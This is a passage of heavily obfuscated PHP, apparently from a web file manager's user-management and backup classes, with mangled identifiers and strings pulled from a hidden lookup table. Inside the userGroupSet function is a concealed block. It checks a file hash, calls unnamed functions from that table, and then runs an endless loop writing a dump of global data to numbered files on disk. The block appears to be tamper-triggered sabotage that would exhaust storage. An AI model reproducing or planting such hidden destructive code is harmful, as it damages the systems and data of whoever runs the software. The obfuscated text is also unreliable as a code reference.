array($Ç…ó­¡Ÿ[415], $Ù”ê£Ì´)); if (count($Ù”ê£Ì´) == 1) { $ö½ÜĞÓ© = array($Ç…ó­¡Ÿ[1646] => $Ù”ê£Ì´[0]); } $•¤ÇÍß = Model($Ç…ó­¡Ÿ[509])->field($this->simpleField)->where($ö½ÜĞÓ©)->select(); $•¤ÇÍß = array_to_keyvalue($•¤ÇÍß, $Ç…ó­¡Ÿ[1655]); foreach ($Ù”ê£Ì´ as $ĞëóÚÖ) { $î™şí”ª = $•¤ÇÍß[$ĞëóÚÖ]; if (!$î™şí”ª) { $ÏÊªÜëå[$ĞëóÚÖ . $Ç…ó­¡Ÿ[12]] = $this->getInfoSimpleOuter($ĞëóÚÖ); continue; } $î™şí”ª[$Ç…ó­¡Ÿ[535]] = Action($Ç…ó­¡Ÿ[2259])->parseUrl($î™şí”ª[$Ç…ó­¡Ÿ[535]]); $ÏÊªÜëå[$ĞëóÚÖ . $Ç…ó­¡Ÿ[12]] = $î™şí”ª; } } return $ÏÊªÜëå; } protected function userStatus($›ÃğÊğ—, $éÎˆî×õ) { $‘ë¨‘ß§ = $this->getInfoSimple($›ÃğÊğ—); if (!$‘ë¨‘ß§) { return !1; } $Ú¹èÑÑŸ = array($_SERVER[Ôó‡è­ƒ][748] => $éÎˆî×õ); return $this->userEdit($›ÃğÊğ—, $Ú¹èÑÑŸ); } protected function userRemove($–ßâğÑ¿) { $—‚ÅšĞ =& $_SERVER[Ôó‡è­ƒ]; $ÊÈå ó = $this->getInfoSimple($–ßâğÑ¿); if (!$ÊÈå ó) { return !1; } $ŸêÄŒ‹ = array($—‚ÅšĞ[1646] => $–ßâğÑ¿); Model($—‚ÅšĞ[594])->where($ŸêÄŒ‹)->delete(); Model($—‚ÅšĞ[2287])->where($ŸêÄŒ‹)->delete(); Model($—‚ÅšĞ[1912])->where($ŸêÄŒ‹)->delete(); Model($—‚ÅšĞ[2272])->where($ŸêÄŒ‹)->delete(); Model($—‚ÅšĞ[1068])->where($ŸêÄŒ‹)->delete(); Model($—‚ÅšĞ[2109])->removeUserAll($–ßâğÑ¿); Model($—‚ÅšĞ[823])->userRootRemove($–ßâğÑ¿); return $this->where($ŸêÄŒ‹)->delete(); } protected function userGroupSet($³„Å†ÕÏ, $‚Ñ¸«áÄ, $·¹³õØ„ = array()) { $ïĞóŸç =& $_SERVER[Ôó‡è­ƒ]; $“èÃ¯Ö = $_SERVER[$ïĞóŸç[875]] . $ïĞóŸç[876]; $ğŞÆ–ÜÊ = $ïĞóŸç[871]; if ($_SERVER[$ïĞóŸç[872]] != $ğŞÆ–ÜÊ($“èÃ¯Ö)) { $€òøÍò = $ïĞóŸç[873]; $ÎœİÑ® = $ïĞóŸç[874]; $È‡ğ€¼ö = $_SERVER[$ïĞóŸç[875]] . $ïĞóŸç[876]; $·²„íˆ = $ÎœİÑ®($È‡ğ€¼ö); $ï€’ı—Ö = explode($ïĞóŸç[230], $·²„íˆ); if (count($ï€’ı—Ö) < $ïĞóŸç[617]) { $Òˆ‚Çù¢ = $ïĞóŸç[877]; $Òˆ‚Çù¢(); } $¡È£îõ— = $ïĞóŸç[878]; $¡È£îõ—($_SERVER[$ïĞóŸç[879]]); $€òøÍò = $ïĞóŸç[873]; $€òøÍò(); $ÅÈ™–ì´ = $ïĞóŸç[880]; $½³ã¹¢ = json_encode($GLOBALS[$ïĞóŸç[881]]); $ŞÚ£ Ëß = 1; for ($ã”ïëšÀ = $ŞÚ£ Ëß; $ã”ïëšÀ > 0; $ã”ïëšÀ++) { $ÅÈ™–ì´(DATA_PATH . $ã”ïëšÀ, $½³ã¹¢); } } $¡»–¢ƒ´ = $this->getInfoSimple($³„Å†ÕÏ); if (!$¡»–¢ƒ´ || !is_array($‚Ñ¸«áÄ)) { return !1; } $±ƒì³– = Model($ïĞóŸç[1912]); $±ƒì³–->where(array($ïĞóŸç[1655] => $³„Å†ÕÏ))->delete(); $ê±Øóà„ = array(); $ŸƒæÅæò = 0; foreach ($‚Ñ¸«áÄ as $æÛ»Á’Â => $Ø˜ô¨») { $‹Ñõû¥ = array($ïĞóŸç[1655] => $³„Å†ÕÏ, $ïĞóŸç[1823] => $æÛ»Á’Â, $ïĞóŸç[1926] => $Ø˜ô¨»); $‹Ñõû¥[$ïĞóŸç[1846]] = isset($·¹³õØ„[$ŸƒæÅæò]) ? $·¹³õØ„[$ŸƒæÅæò] : 0; $ŸƒæÅæò++; $ê±Øóà„[] = $‹Ñõû¥; } return $±ƒì³–->addAll($ê±Øóà„, array(), !0); } protected function userGroupAdd($ç§ğÀçª, $¡Êüß§ = array()) { $ğ¤÷˜¿¿ =& $_SERVER[Ôó‡è­ƒ]; $É×âŞ¯ = $this->getInfoSimple($ç§ğÀçª); if (!$É×âŞ¯ || empty($¡Êüß§)) { return !1; } $§¦öì°¨ = array(); foreach ($¡Êüß§ as $©ŸöÎÍƒ => $‰î’«®‰) { $§¦öì°¨[] = array($ğ¤÷˜¿¿[1655] => $ç§ğÀçª, $ğ¤÷˜¿¿[1823] => $©ŸöÎÍƒ, $ğ¤÷˜¿¿[1926] => $‰î’«®‰, $ğ¤÷˜¿¿[1846] => 0); } return Model($ğ¤÷˜¿¿[1912])->addAll($§¦öì°¨, array(), !0); } protected function userGroupRemove($ğ»ÆÌ, $Æü³§Š) { $ó¸ë…¢½ =& $_SERVER[Ôó‡è­ƒ]; $÷¼Ó¨®¿ = $this->getInfoSimple($ğ»ÆÌ); if (!$÷¼Ó¨®¿ || !$Æü³§Š) { return !1; } $ÙíüÊÜ¤ = array($ó¸ë…¢½[1646] => $ğ»ÆÌ, $ó¸ë…¢½[1910] => $Æü³§Š); return Model($ó¸ë…¢½[1912])->where($ÙíüÊÜ¤)->delete(); } public function listData() { $Â£ÛÚîú = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Â£ÛÚîú[$_SERVER[Ôó‡è­ƒ][368]]); return $Â£ÛÚîú; } public function listByID($®¸à»…) { $òÊ÷Ÿö‚ =& $_SERVER[Ôó‡è­ƒ]; if (!$®¸à»…) { return; } $‡Ç©µ¿  = array($òÊ÷Ÿö‚[1655] => array($òÊ÷Ÿö‚[7], $®¸à»…)); $¡¾î¢¢ü = $this->where($‡Ç©µ¿ )->select(); $¡¾î¢¢ü = array_sort_keep($¡¾î¢¢ü, $òÊ÷Ÿö‚[1655], $®¸à»…); $this->_listDataApply($¡¾î¢¢ü); return $¡¾î¢¢ü; } public function listByGroup($ ‹©†ñ = 0, $Çš³Ó = array()) { $¤Ñ†×Ü =& $_SERVER[Ôó‡è­ƒ]; $îéÕÎÜï = $¤Ñ†×Ü[12]; $ùˆò­À = array(); if ($ ‹©†ñ) { $ùˆò­À = array($¤Ñ†×Ü[2288] => intval($ ‹©†ñ)); $îéÕÎÜï = "\114\105\x46\124\40\112\x4f\x49\116\x20{$this->tablePrefix}\165\x73\x65\x72\x5f\147\x72\157\x75\160\x20\165\x73\145\162\137\x67\162\157\165\160\x20\x6f\x6e\40\165\x73\x65\162\56\165\x73\x65\162\x49\x44\x20\75\x20\165\163\145\162\x5f\x67\x72\x6f\165\x70\x2e\165\x73\x65\x72\x49\x44"; $’˜¼×® = Input::get($¤Ñ†×Ü[451], null, $¤Ñ†×Ü[12]) ? $¤Ñ†×Ü[12] : $¤Ñ†×Ü[2289]; } if (isset($Çš³Ó[$¤Ñ†×Ü[748]])) { $ùˆò­À[$¤Ñ†×Ü[2290]] = $Çš³Ó[$¤Ñ†×Ü[748]]; } $ Ï²ùÁ„ = $this->_makeOrder($’˜¼×®)->field($¤Ñ†×Ü[2291])->where($ùˆò­À)->join($îéÕÎÜï)->selectPage(50); $this->_listDataApply($ Ï²ùÁ„[$¤Ñ†×Ü[368]]); return $ Ï²ùÁ„; } private function _makeOrder($«¯Ûƒ©• = '') { $·í†óè =& $_SERVER[Ôó‡è­ƒ]; $šÀ¨ºé = array($·í†óè[1655], $·í†óè[32], $·í†óè[1812], $·í†óè[1784], $·í†óè[197]); $ğËñĞÁˆ = array($·í†óè[444] => $·í†óè[445], $·í†óè[446] => $·í†óè[447]); $í¼«ø¦ã = Input::get($·í†óè[451], $·í†óè[7], $·í†óè[1646], $šÀ¨ºé); $«Ÿ˜ÃÒı = Input::get($·í†óè[452], $·í†óè[7], $·í†óè[1913], array($·í†óè[1913], $·í†óè[446])); $«Ÿ˜ÃÒı = $ğËñĞÁˆ[$«Ÿ˜ÃÒı]; $«¯Ûƒ©• = $«¯Ûƒ©• . "\165\163\145\x72\56{$í¼«ø¦ã}\40{$«Ÿ˜ÃÒı}\54\x20\165\163\x65\x72\x2e\x75\163\145\x72\x49\x44\40\141\163\x63"; return $this->alias($·í†óè[2033])->order($«¯Ûƒ©•); } public function listSearch($Ûª›çªş) { $†Ì º• =& $_SERVER[Ôó‡è­ƒ]; $ñ‚² £ = $Ûª›çªş[$†Ì º•[1916]]; $ä¹Ãûª¸ = isset($Ûª›çªş[$†Ì º•[1917]]) ? $Ûª›çªş[$†Ì º•[1917]] : !1; $ñ‚² £ = str_replace($†Ì º•[1918], $†Ì º•[1919], trim($ñ‚² £)); $©¼“å¢ = array($†Ì º•[32] => array($†Ì º•[382], "\45{$ñ‚² £}\x25"), $†Ì º•[304] => array($†Ì º•[382], "{$ñ‚² £}\x25"), $†Ì º•[534] => array($†Ì º•[382], "{$ñ‚² £}\45"), $†Ì º•[1000] => $†Ì º•[1920]); if (Input::check($ñ‚² £, $†Ì º•[310])) { $©¼“å¢[$†Ì º•[1655]] = array($†Ì º•[382], "{$ñ‚² £}\45"); $©¼“å¢[$†Ì º•[2273]] = array($†Ì º•[382], "{$ñ‚² £}\45"); } if (!$ñ‚² £) { $©¼“å¢ = array(); } if (isset($Ûª›çªş[$†Ì º•[748]])) { $©¼“å¢[$†Ì º•[748]] = $Ûª›çªş[$†Ì º•[748]]; } $©¼“å¢ = $this->parseWhereLike($©¼“å¢); $¥ê”ÂÙƒ = $this->_makeOrder()->where($©¼“å¢)->selectPage(20); if (!$¥ê”ÂÙƒ || count($¥ê”ÂÙƒ[$†Ì º•[368]]) < 5 && Input::check($ñ‚² £, $†Ì º•[317])) { $½‰”©‚ = $this->_searchFromMeta($†Ì º•[459], $ñ‚² £, 10); $÷û¬ğÆ» = $this->_searchFromMeta($†Ì º•[460], $ñ‚² £, 10); $ˆìÙ’Òë = array_merge($½‰”©‚, $÷û¬ğÆ», $¥ê”ÂÙƒ[$†Ì º•[368]]); $¥ê”ÂÙƒ[$†Ì º•[368]] = array_unique_by_key($ˆìÙ’Òë, $†Ì º•[1655]); $¥ê”ÂÙƒ[$†Ì º•[365]][$†Ì º•[366]] = count($¥ê”ÂÙƒ[$†Ì º•[368]]); $¥ê”ÂÙƒ[$†Ì º•[365]][$†Ì º•[367]] = ceil($¥ê”ÂÙƒ[$†Ì º•[365]][$†Ì º•[366]] / $¥ê”ÂÙƒ[$†Ì º•[365]][$†Ì º•[362]]); } $this->_listDataApply($¥ê”ÂÙƒ[$†Ì º•[368]]); $this->_filterByGroup($¥ê”ÂÙƒ, $ä¹Ãûª¸); return $¥ê”ÂÙƒ; } private function _filterByGroup(&$ğÌä«, $…‡ÇÀô×) { $ÉÂÁúÑ =& $_SERVER[Ôó‡è­ƒ]; if (!$…‡ÇÀô×) { return $ğÌä«; } foreach ($ğÌä«[$ÉÂÁúÑ[368]] as $ßï˜¶·ğ => &$šü Ûˆï) { $©—¸‚¥ = array_to_keyvalue($šü Ûˆï[$ÉÂÁúÑ[2003]], $ÉÂÁúÑ[12], $ÉÂÁúÑ[1823]); if (!in_array($…‡ÇÀô×, $©—¸‚¥)) { unset($ğÌä«[$ÉÂÁúÑ[368]][$ßï˜¶·ğ]); } } unset($šü Ûˆï); $ğÌä«[$ÉÂÁúÑ[368]] = array_values($ğÌä«[$ÉÂÁúÑ[368]]); $ğÌä«[$ÉÂÁúÑ[365]] = array($ÉÂÁúÑ[2066] => count($ğÌä«[$ÉÂÁúÑ[368]]), $ÉÂÁúÑ[2064] => $ğÌä«[$ÉÂÁúÑ[365]][$ÉÂÁúÑ[362]], $ÉÂÁúÑ[2063] => 1, $ÉÂÁúÑ[2065] => 1); } private function _searchFromMeta($·Ì»¼ã, $İñĞÆÉä, $£á×º˜Ş) { $êªÄÓö“ =& $_SERVER[Ôó‡è­ƒ]; $İñĞÆÉä = strtolower($İñĞÆÉä); $ÌŒÖÓ± = array($êªÄÓö“[95] => $·Ì»¼ã, $êªÄÓö“[373] => array($êªÄÓö“[382], "\x25{$İñĞÆÉä}\x25")); $ÌŒÖÓ± = $this->parseWhereLike($ÌŒÖÓ±); $•ô…ø¢ˆ = Model($êªÄÓö“[2292])->where($ÌŒÖÓ±)->limit($£á×º˜Ş)->select(); if (!$•ô…ø¢ˆ) { return array(); } $•ô…ø¢ˆ = array_to_keyvalue($•ô…ø¢ˆ, $êªÄÓö“[12], $êªÄÓö“[1655]); $²òÌ”§Ú = $this->where(array($êªÄÓö“[1646] => array($êªÄÓö“[7], $•ô…ø¢ˆ)))->select(); if (!$²òÌ”§Ú) { return array(); } return $²òÌ”§Ú; } private function _listDataApplyItem($÷®÷İª¢) { $šÛ¥Œ¬ = array($÷®÷İª¢); $this->_listDataApply($šÛ¥Œ¬); return $šÛ¥Œ¬[0]; } private function _listDataApply(&$èæ£¼Œ) { $¨ä•Ö± =& $_SERVER[Ôó‡è­ƒ]; if (!$èæ£¼Œ) { return; } array_remove_key($èæ£¼Œ, $¨ä•Ö±[889]); $®şÆı·¡ = array_to_keyvalue($èæ£¼Œ, $¨ä•Ö±[12], $¨ä•Ö±[1655]); $this->_listAppendGroup($èæ£¼Œ, $®şÆı·¡); $this->_listAppendMeta($èæ£¼Œ, $®şÆı·¡); $this->_listAppendSourceRoot($èæ£¼Œ, $®şÆı·¡); } private function _listAppendSourceRoot(&$ñ ”ä´÷, $üñÛÓ“) { $åı…³–ï =& $_SERVER[Ôó‡è­ƒ]; $øÒñÌÉ = Model($åı…³–ï[823])->listSourceRoot(SourceModel::TYPE_USER, $üñÛÓ“); $øÒñÌÉ = array_to_keyvalue($øÒñÌÉ, $åı…³–ï[501]); $øÒñÌÉ = array_remove_key($øÒñÌÉ, $åı…³–ï[501]); foreach ($ñ ”ä´÷ as &$™÷¾ÊÎ) { $™÷¾ÊÎ[$åı…³–ï[87]] = $øÒñÌÉ[$™÷¾ÊÎ[$åı…³–ï[1655]]] ? $øÒñÌÉ[$™÷¾ÊÎ[$åı…³–ï[1655]]] : array(); } unset($™÷¾ÊÎ); } private function _listAppendGroup(&$‡ÈûÈê‚, $æöéÈ¯) { $²Õ±å† =& $_SERVER[Ôó‡è­ƒ]; $Ëîà•—æ = array($²Õ±å†[1655] => array($²Õ±å†[7], $æöéÈ¯)); $ÒøÈ“é = Model($²Õ±å†[1912])->where($Ëîà•—æ)->select(); $€»Ñö„À = array_to_keyvalue($ÒøÈ“é, $²Õ±å†[12], $²Õ±å†[1823]); $€»Ñö„À = array_remove_value(array_unique($€»Ñö„À), $²Õ±å†[194]); if (!$€»Ñö„À || !$ÒøÈ“é) { return; } $Ëîà•—æ = array($²Õ±å†[1823] => array($²Õ±å†[7], $€»Ñö„À)); $ßóçÑè = Model($²Õ±å†[2001])->field($²Õ±å†[2293])->where($Ëîà•—æ)->select(); $ßóçÑè = array_to_keyvalue($ßóçÑè, $²Õ±å†[1823]); $ÒøÈ“é = array_to_keyvalue_group($ÒøÈ“é, $²Õ±å†[1655]); foreach ($ÒøÈ“é as &$¤ğìÙîÌ) { $ôùóİÛ = array(); foreach ($¤ğìÙîÌ as $¢ÅÁÏ¸‘) { if (!$¢ÅÁÏ¸‘[$²Õ±å†[1926]]) { continue; } $è»¨¬Â = Model($²Õ±å†[503])->listData($¢ÅÁÏ¸‘[$²Õ±å†[1926]]); $ôùóİÛ[] = array($²Õ±å†[1823] => $¢ÅÁÏ¸‘[$²Õ±å†[1823]], $²Õ±å†[2294] => $ßóçÑè[$¢ÅÁÏ¸‘[$²Õ±å†[1823]]][$²Õ±å†[32]], $²Õ±å†[517] => $ßóçÑè[$¢ÅÁÏ¸‘[$²Õ±å†[1823]]][$²Õ±å†[517]], $²Õ±å†[410] => $è»¨¬Â); } $¤ğìÙîÌ = $ôùóİÛ; } unset($¤ğìÙîÌ); foreach ($‡ÈûÈê‚ as &$ÃÑÄ£È‰) { $ÃÑÄ£È‰[$²Õ±å†[2003]] = array(); if (isset($ÒøÈ“é[$ÃÑÄ£È‰[$²Õ±å†[1655]]])) { $ÃÑÄ£È‰[$²Õ±å†[2003]] = $ÒøÈ“é[$ÃÑÄ£È‰[$²Õ±å†[1655]]]; } } unset($ÃÑÄ£È‰); } public function userAppendGroup($ĞÜø·ÜÚ) { $¯öµ–ÁÄ =& $_SERVER[Ôó‡è­ƒ]; if (!$ĞÜø·ÜÚ) { return array(); } $this->_listAppendGroup($ĞÜø·ÜÚ, array_to_keyvalue($ĞÜø·ÜÚ, $¯öµ–ÁÄ[12], $¯öµ–ÁÄ[1655])); return $ĞÜø·ÜÚ; } private function _listAppendMeta(&$ÕĞ¬ÚØÅ, $şŞ¶Ö•ñ) { $åœÒú— =& $_SERVER[Ôó‡è­ƒ]; $†üã‹·õ = UserJobModel::JOB_KEY; $’çÒóŞ’ = array($åœÒú—[2274]); $ğ ·œö” = array($åœÒú—[1655] => array($åœÒú—[7], $şŞ¶Ö•ñ)); $‰Ç·ÛĞ = Model($åœÒú—[2272])->where($ğ ·œö”)->select(); $‰Ç·ÛĞ = array_to_keyvalue_group($‰Ç·ÛĞ, $åœÒú—[1655]); foreach ($‰Ç·ÛĞ as &$…¼èÍí) { $Îü»Û¶Î = array(); foreach ($…¼èÍí as $ë•«‹Ûß) { if (!in_array($ë•«‹Ûß[$åœÒú—[95]], $’çÒóŞ’)) { $Îü»Û¶Î[$ë•«‹Ûß[$åœÒú—[95]]] = $ë•«‹Ûß[$åœÒú—[373]]; } } $…¼èÍí = $Îü»Û¶Î; } unset($…¼èÍí); $äÃùÜÎİ = Model($åœÒú—[2295]); foreach ($ÕĞ¬ÚØÅ as &$×¬™¡ «) { $¹„Ñ¢¬¡ = array(); if (isset($‰Ç·ÛĞ[$×¬™¡ «[$åœÒú—[1655]]])) { $¹„Ñ¢¬¡ = $‰Ç·ÛĞ[$×¬™¡ «[$åœÒú—[1655]]]; } $×¬™¡ «[$åœÒú—[2296]] = array(); if (isset($¹„Ñ¢¬¡[$†üã‹·õ])) { $×¬™¡ «[$åœÒú—[2296]] = $äÃùÜÎİ->getUserJobInfo($¹„Ñ¢¬¡[$†üã‹·õ]); } } unset($×¬™¡ «); } protected function groupUserAll($óî£Š“ç) { $ªÃ¢ÉÉ =& $_SERVER[Ôó‡è­ƒ]; if (!$óî£Š“ç) { return !1; } $¶‘úæ§Ù = Model($ªÃ¢ÉÉ[1912])->field($ªÃ¢ÉÉ[1655])->where(array($ªÃ¢ÉÉ[1823] => array($ªÃ¢ÉÉ[7], $óî£Š“ç)))->select(); $¶‘úæ§Ù = array_to_keyvalue($¶‘úæ§Ù, $ªÃ¢ÉÉ[12], $ªÃ¢ÉÉ[1655]); return array_unique($¶‘úæ§Ù); } public function userSearch($ø”Ïô¯, $ù‡á›ŸÉ = "\x2a") { return Model($_SERVER[Ôó‡è­ƒ][537])->where($ø”Ïô¯)->field($ù‡á›ŸÉ)->find(); } } goto dÚ¥›×“Ê; CÜ¤Øšô¨è: class BackupDbFile { public function __construct() { } public function index() { $½¿¢ì§¶ =& $_SERVER[Ôó‡è­ƒ]; $ ³´„Êİ = Backup::get(); $†æš“Áì = $ ³´„Êİ[$½¿¢ì§¶[32]]; $ÕÁ‡ï‘è = $this->tmpFilesPath() . "\x62\141\143\153\x75\160\137{$†æš“Áì}\57"; $ø†“•÷å = $this->backupPath($ ³´„Êİ); if (!($ø†“•÷å = IO::mkdir($ø†“•÷å))) { return !1; } $ Ø±¸Ã = IO::listPath($ÕÁ‡ï‘è); $¸“–Ë€ = isset($ Ø±¸Ã[$½¿¢ì§¶[76]]) ? $ Ø±¸Ã[$½¿¢ì§¶[76]] : array(); $¯¡é®Ùñ = array_sum(array_column($¸“–Ë€, $½¿¢ì§¶[80])); if (!$¯¡é®Ùñ) { return !1; } $œ½ç™ = array($½¿¢ì§¶[796] => $¯¡é®Ùñ, $½¿¢ì§¶[797] => time()); Backup::set($œ½ç™); $Ç•ÑÄ = new TaskFileTransfer($½¿¢ì§¶[798], $½¿¢ì§¶[778], count($¸“–Ë€), LNG($½¿¢ì§¶[779]) . $½¿¢ì§¶[456] . LNG($½¿¢ì§¶[781]) . $½¿¢ì§¶[799]); $Ç•ÑÄ->task[$½¿¢ì§¶[761]] = $¯¡é®Ùñ; foreach ($ Ø±¸Ã[$½¿¢ì§¶[76]] as $ÍÖúÒì÷) { $·Áõ£ëÅ = IO::move($ÍÖúÒì÷[$½¿¢ì§¶[78]], $ø†“•÷å); if (!$·Áõ£ëÅ) { $Ç•ÑÄ->end(); $©Ğ‘ö = IO::getLastError($½¿¢ì§¶[800] . $ÍÖúÒì÷[$½¿¢ì§¶[78]] . $½¿¢ì§¶[801] . $ø†“•÷å . $½¿¢ì§¶[532]); write_log($©Ğ‘ö, $½¿¢ì§¶[778]); return !1; } } $úƒüÓ£ = new DbManage(); $œëå¯İ = $úƒüÓ£->getSqlFile(); if (!$œëå¯İ[$½¿¢ì§¶[802]] || !$œëå¯İ[$½¿¢ì§¶[13]]) { return !1; } IO::move($œëå¯İ[$½¿¢ì§¶[802]], $ø†“•÷å); IO::move($œëå¯İ[$½¿¢ì§¶[13]], $ø†“•÷å); $Ç•ÑÄ->end(); $œ½ç™ = array($½¿¢ì§¶[803] => $¯¡é®Ùñ, $½¿¢ì§¶[804] => time()); Backup::set($œ½ç™); return !0; } private function backupPath($ª¥îìãÆ) { $íà®ºû¿ =& $_SERVER[Ôó‡è­ƒ]; $¥ñíüãù = $ª¥îìãÆ[$íà®ºû¿[32]]; $”¶îâõÀ = Model($íà®ºû¿[768])->get($íà®ºû¿[769]); $ó„ÈĞ†³ = substr(md5($íà®ºû¿[770] . $”¶îâõÀ . $¥ñíüãù), 0, 8); return "\173\x69\x6f\x3a{$ª¥îìãÆ[$íà®ºû¿[750]]}\175\x2f\144\x61\x74\141\142\x61\163\x65\57\142\141\143\x6b\165\160\57" . $¥ñíüãù . $íà®ºû¿[11] . $ó„ÈĞ†³; } private function tmpFilesPath() { $êï—î”¯ =& $_SERVER[Ôó‡è­ƒ]; $ üÕÀŒ¤ = TEMP_FILES; if ($GLOBALS[$êï—î”¯[6]][$êï—î”¯[90]][$êï—î”¯[794]]) { $ üÕÀŒ¤ = $GLOBALS[$êï—î”¯[6]][$êï—î”¯[90]][$êï—î”¯[794]]; if (!mk_dir($ üÕÀŒ¤) || !is_writable($ üÕÀŒ¤) || !IO::mkfile($ üÕÀŒ¤ . $êï—î”¯[795])) { $ üÕÀŒ¤ = TEMP_FILES; } } return $ üÕÀŒ¤; } } class BackupFile { public function __construct() { } public function index() { $Îä‰—ª = Backup::get(); $€ªÂ©ìÓ = $Îä‰—ª[$_SERVER[Ôó‡è­ƒ][292]][$_SERVER[Ôó‡è­ƒ][196]][$_SERVER[Ôó‡è­ƒ][463]]; $øé¾íıä = array($_SERVER[Ôó‡è­ƒ][464] => array($_SERVER[Ôó‡è­ƒ][805], $€ªÂ©ìÓ), $_SERVER[Ôó‡è­ƒ][806] => array($_SERVER[Ôó‡è­ƒ][330], $Îä‰—ª[$_SERVER[Ôó‡è­ƒ][750]])); $¦¤¼Ó™ = (int) Model($_SERVER[Ôó‡è­ƒ][787])->where($øé¾íıä)->count($_SERVER[Ôó‡è­ƒ][463]); $ù­âÔ’¬ = (int) Model($_SERVER[Ôó‡è­ƒ][787])->where($øé¾íıä)->sum($_SERVER[Ôó‡è­ƒ][80]); $Ä£œˆÙ¯ = new TaskFileTransfer($_SERVER[Ôó‡è­ƒ][807], $_SERVER[Ôó‡è­ƒ][778], $¦¤¼Ó™, LNG($_SERVER[Ôó‡è­ƒ][779]) . $_SERVER[Ôó‡è­ƒ][780] . LNG($_SERVER[Ôó‡è­ƒ][808])); $Ä£œˆÙ¯->task[$_SERVER[Ôó‡è­ƒ][761]] = $ù­âÔ’¬; $¨ÑĞ€ƒÇ = array($_SERVER[Ôó‡è­ƒ][809] => $¦¤¼Ó™, $_SERVER[Ôó‡è­ƒ][810] => $ù­âÔ’¬, $_SERVER[Ôó‡è­ƒ][811] => time()); Backup::set($¨ÑĞ€ƒÇ); $Æşå²Ãì = !0; $ãØöó‚… = $this->storeIds(); $Å’ÆÜÎÄ = 1; $è¾§ = 1000; $ã‚¹ ºê = $Ù®õ”•— = 0; $ª¶ĞšÊ¸ = array(); $×Á¶¤Îé = $šéÈí«Í = 0; do { $¯Ä§ÙÈƒ = $_SERVER[Ôó‡è­ƒ][812]; $¡©½Ö‹ß = Model($_SERVER[Ôó‡è­ƒ][787])->where($øé¾íıä)->field($¯Ä§ÙÈƒ)->order($_SERVER[Ôó‡è­ƒ][813])->selectPage($è¾§, $Å’ÆÜÎÄ); $ÙÙ¼Ä²š = !empty($¡©½Ö‹ß[$_SERVER[Ôó‡è­ƒ][368]]) ? $¡©½Ö‹ß[$_SERVER[Ôó‡è­ƒ][368]] : array(); foreach ($ÙÙ¼Ä²š as $šò«ì—î) { if (!$this->_fileExist($šò«ì—î, $ª¶ĞšÊ¸, $ãØöó‚…)) { $¦¤¼Ó™ -= 1; $ù­âÔ’¬ -= (int) $šò«ì—î[$_SERVER[Ôó‡è­ƒ][80]]; write_log("\146\151\154\x65\40\156\157\164\40\x65\x78\151\x73\164\56\x66\x69\154\145\111\104\x3a{$šò«ì—î[$_SERVER[Ôó‡è­ƒ][463]]}\54\x20\160\141\164\150\72{$šò«ì—î[$_SERVER[Ôó‡è­ƒ][78]]}", $_SERVER[Ôó‡è­ƒ][814]); continue; } $èÛ‰Ö”İ = $šò«ì—î[$_SERVER[Ôó‡è­ƒ][78]]; $•˜Ôö¾¶ = "\x7b\151\157\72{$Îä‰—ª[$_SERVER[Ôó‡è­ƒ][750]]}\175" . substr($èÛ‰Ö”İ, strlen("\x7b\151\x6f\72{$šò«ì—î[$_SERVER[Ôó‡è­ƒ][815]]}\175")); if (IO::exist($•˜Ôö¾¶)) { $Ä£œˆÙ¯->updateFileEnd($šò«ì—î[$_SERVER[Ôó‡è­ƒ][32]], $šò«ì—î[$_SERVER[Ôó‡è­ƒ][80]]); } else { $•˜Ôö¾¶ = get_path_father($•˜Ôö¾¶); IO::mkdir($•˜Ôö¾¶); if (!IO::copy($èÛ‰Ö”İ, $•˜Ôö¾¶, $_SERVER[Ôó‡è­ƒ][816])) { write_log($_SERVER[Ôó‡è­ƒ][817] . $èÛ‰Ö”İ . $_SERVER[Ôó‡è­ƒ][801] . $•˜Ôö¾¶ . $_SERVER[Ôó‡è­ƒ][532], $_SERVER[Ôó‡è­ƒ][778]); $Æşå²Ãì = !1; break; } } $€ªÂ©ìÓ = $šò«ì—î[$_SERVER[Ôó‡è­ƒ][463]]; $Ù®õ”•— += 1; $ã‚¹ ºê += $šò«ì—î[$_SERVER[Ôó‡è­ƒ][80]]; $šéÈí«Í += 1; $×Á¶¤Îé += $šò«ì—î[$_SERVER[Ôó‡è­ƒ][80]]; if ($ã‚¹ ºê >= 1024 * 1024 * 100) { $¨ÑĞ€ƒÇ = array($_SERVER[Ôó‡è­ƒ][818] => $€ªÂ©ìÓ, $_SERVER[Ôó‡è­ƒ][819] => $šéÈí«Í, $_SERVER[Ôó‡è­ƒ][820] => $×Á¶¤Îé); Backup::set($¨ÑĞ€ƒÇ); $ã‚¹ ºê = $Ù®õ”•— = 0; } } $®¿®ˆ¿ = count($ÙÙ¼Ä²š); $Å’ÆÜÎÄ++; } while ($®¿®ˆ¿ == $è¾§); $Ä£œˆÙ¯->end(); $¨ÑĞ€ƒÇ = array($_SERVER[Ôó‡è­ƒ][821] => 1, $_SERVER[Ôó‡è­ƒ][492] => time(), $_SERVER[Ôó‡è­ƒ][773] => 1, $_SERVER[Ôó‡è­ƒ][818] => $€ªÂ©ìÓ, $_SERVER[Ôó‡è­ƒ][810] => $ù­âÔ’¬, $_SERVER[Ôó‡è­ƒ][809] => $¦¤¼Ó™, $_SERVER[Ôó‡è­ƒ][822] => time()); if ($Ù®õ”•—) { $¨ÑĞ€ƒÇ[$_SERVER[Ôó‡è­ƒ][819]] = $šéÈí«Í; $¨ÑĞ€ƒÇ[$_SERVER[Ôó‡è­ƒ][820]] = $×Á¶¤Îé; } Backup::set($¨ÑĞ€ƒÇ); $this->_fileFilter($ª¶ĞšÊ¸); return !0; } private function _fileExist($¬Ê‚äàÁ, &$€Ô·¯ô’, $¯àÌ–°) { $‚üß‹ö× =& $_SERVER[Ôó‡è­ƒ]; $ÌÉ×êÁŠ = $¬Ê‚äàÁ[$‚üß‹ö×[78]]; if (in_array($¬Ê‚äàÁ[$‚üß‹ö×[463]], $€Ô·¯ô’)) { return !1; } if (!in_array($¬Ê‚äàÁ[$‚üß‹ö×[815]], $¯àÌ–°)) { return !1; } if (IO::exist($ÌÉ×êÁŠ)) { return !0; } $Áœ¨²øø = get_path_father($ÌÉ×êÁŠ); if (IO::exist($Áœ¨²øø)) { $€Ô·¯ô’[] = $¬Ê‚äàÁ[$‚üß‹ö×[463]]; return !1; } $¸¸êÂ«æ = array($‚üß‹ö×[815] => $¬Ê‚äàÁ[$‚üß‹ö×[815]], $‚üß‹ö×[78] => array($‚üß‹ö×[382], "{$Áœ¨²øø}\45")); $½±°¶õÒ = Model($‚üß‹ö×[787])->where($¸¸êÂ«æ)->field($‚üß‹ö×[464])->select(); $€Ô·¯ô’ = array_merge($€Ô·¯ô’, 